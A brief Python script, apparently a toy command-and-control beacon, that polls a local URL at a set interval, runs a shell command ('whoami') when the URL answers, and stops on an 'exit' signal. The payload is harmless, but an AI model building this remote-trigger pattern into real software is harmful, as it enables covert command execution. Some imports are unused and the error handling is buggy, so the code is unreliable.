import os
from re import A
from telnetlib import STATUS
import urllib.request
from async_timeout import timeout
from time import sleep

baseurl="127.0.0.1"
flag=input("请输入URL：")
time=float (input("心跳时间："))
payload="whoami"
def rt(flag):
    try:
        response=urllib.request.urlopen('http://'+baseurl+'/'+flag,timeout=3).code
        html=response
        return html
    except urllib.error.URLError as html:
        return html.code
    except urllib.error.HTTPError as html:
        #print(html)
        return html.code
def live():
        try:
            response2=urllib.request.urlopen('http://'+baseurl+'/'+flag+'exit',timeout=3).code
            html=response2
            return html
        except urllib.error.URLError as html:
            return html.code
while True:
    t1=rt(flag)
    print("t1的值是",t1)
    #sleep(time*3600)
    sleep(time)
    if t1 == 200:
        shell=os.system(payload)
        print(shell)
        continue
    else:
        status=live()
        if status ==200:
            print("销毁命令已执行")
            break
        else:
            print("控制端离线")

